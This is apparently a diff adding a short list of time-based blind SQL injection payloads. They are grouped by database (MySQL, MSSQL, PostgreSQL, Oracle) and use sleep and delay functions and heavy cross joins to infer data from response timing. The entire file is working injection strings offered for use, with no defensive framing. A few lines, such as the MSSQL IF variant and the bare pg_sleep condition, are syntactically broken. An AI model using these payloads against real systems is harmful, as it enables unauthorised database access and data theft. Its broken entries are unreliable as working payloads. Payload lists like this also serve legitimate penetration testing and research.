@@ -1,0 +1,20 @@
+# Modern Time-Based Blind SQLi Payloads
+
+# MySQL
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND (SELECT 1) AND SLEEP(5)-- -
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1 CROSS JOIN sysusers AS sys2 CROSS JOIN sysusers AS sys3)--
+' AND 1=IF(1=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'--
+
+# PostgreSQL
+' AND pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# Oracle
+' AND 1=dbms_pipe.receive_message('RDS',5)--
+' AND 1=(SELECT count(*) FROM all_users, all_users, all_users, all_users WHERE rownum < 1000)--
